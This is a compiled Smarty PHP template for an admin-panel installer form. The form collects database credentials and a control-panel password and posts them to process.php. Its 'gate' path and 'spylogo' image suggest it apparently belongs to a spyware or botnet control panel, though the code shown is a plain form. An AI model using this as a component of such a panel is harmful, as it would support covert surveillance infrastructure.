<?php /* Smarty version Smarty-3.0.6, created on 2011-03-26 03:55:59
         compiled from "Z:/home/gate/www/client/templates\install.tpl" */ ?>
<?php /*%%SmartyHeaderCode:227984d8d399f5a0a70-53525148%%*/if(!defined('SMARTY_DIR')) exit('no direct access allowed');
$_smarty_tpl->decodeProperties(array (
  'file_dependency' => 
  array (
    '95e8ce997165c0a9251e70b7239248d1cc72b6a4' => 
    array (
      0 => 'Z:/home/gate/www/client/templates\\install.tpl',
      1 => 1296800780,
      2 => 'file',
    ),
  ),
  'nocache_hash' => '227984d8d399f5a0a70-53525148',
  'function' => 
  array (
  ),
  'has_nocache_code' => false,
)); /*/%%SmartyHeaderCode%%*/?>
<html>
<?php $_template = new Smarty_Internal_Template('header.tpl', $_smarty_tpl->smarty, $_smarty_tpl, $_smarty_tpl->cache_id, $_smarty_tpl->compile_id, null, null);
 echo $_template->getRenderedTemplate();?><?php $_template->updateParentVariables(0);?><?php unset($_template);?>
		<script type="text/javascript" src="../scripts/jquery.js"></script>	
<body>

<center>
<div id="div_main" class="div_main">

<noscript>
<font class='error'>Your JavaScript is turned off. Please, enable your JS.</font>
</noscript>

<div id='div_mainp'>
<table cellspacing="0" cellpadding="0" border="0" width='100%' height="50px">
	<tr>
	<td width='1%'><img src='img/install-128px.png' title='install' alt='install'></td>
	<td align='center'><img src='img/spylogo.png' title='logo' alt='logo'></td>
	</tr>
	<tr>
	<td align='center' colspan='2'><h1><b>Admin Panel Installer</b></h1></td>
	</tr>
</table>
</div>


<hr size='1' color='#CCCCCC'>

<div align='center'>

<form id='frm_config' name='frm_config' method='post' target='process' action='process.php'>
<fieldset style="background: #FCFCFC none repeat scroll 0% 0%; width: 500px; -moz-background-clip: border; -moz-background-origin: padding; -moz-background-inline-policy: continuous;">
<legend align="center"><b>Configurations</b>:</legend>
	<table>
	<tr><td colspan='2'><hr size='1' color='#CCCCCC'></td></tr>
	<tr>
		<td colspan='2' align='center'><b>Gate configs</b></td>	
	</tr>
	<tr>
		<td width='200px'>host <b>:</b></td>
		<td><input size='30' name='DB_SERVER' value='localhost'></td>
	</tr>
	<tr>
		<td width='200px'>db <b>:</b></td>
		<td><input size='30' name='DB_NAME' value=''></td>
	</tr>
	<tr>
		<td width='200px'>user <b>:</b></td>
		<td><input size='30' name='DB_USER' value=''></td>
	</tr>
	<tr>
		<td width='200px'>password <b>:</b></td>
		<td><input size='30' name='DB_PASSWORD' value=''></td>
	</tr>
	<tr><td colspan='2'><hr size='1' color='#CCCCCC'></td></tr>
	<tr>
		<td colspan='2' align='center'><b>Admin</b></td>	
	</tr>
	<tr>
		<td width='200px'>password<br><i>(for CP)</i> <b>:</b></td>
		<td><input size='30' name='ADMIN_PASSWORD' value=''></td>
	</tr>
	
	<tr><td colspan='2'><hr size='1' color='#CCCCCC'></td></tr>
	</table>
</fieldset>
<input type='hidden' name='ROOT_PATH' value='<?php echo $_smarty_tpl->getVariable('ROOT_PATH')->value;?>
'>
<input type='submit' value='install' >
</form>

</div>

<!-- POPUP WINDOW -->
<div id='popup_wnd'></div> 
<div id='popup_cont'><table class='popup_cont'><tr><td align='center'>
<table class='popup_data' cellspacing=0><tr><td><div id='ptitle'>title</div><div id='close'>Close</div></td></tr>
<tr><td><div id='pdata'>

<iframe name='process' id='process' style='width:776px; height:345px; border:0px;'></iframe>	
</div></td></tr></table>
</td></tr></table></div>
<!-- POPUP END -->


<div id='div_results' align='center'></div>
</div>
</center>
	

<script type='text/javascript'>
function LoadPopup(file, title, width) { $("#popup_wnd").css("visibility", "visible"); $("#popup_cont").css("visibility", "visible"); $("#ptitle").html(title); if(width == false) width=500;  $("#pdata").css("width", width);  }
$(document).ready(function()
{
	$("#close").click(function() { 	$("#popup_wnd").css("visibility", "hidden"); $("#popup_cont").css("visibility", "hidden"); });
	$("#frm_config").submit(function() 
	{
		pdata = $('#frm_config').serialize(true);
		LoadPopup('about:blank', 'Installing Log', 776);
	});
});
</script>

	
	</body>
</html>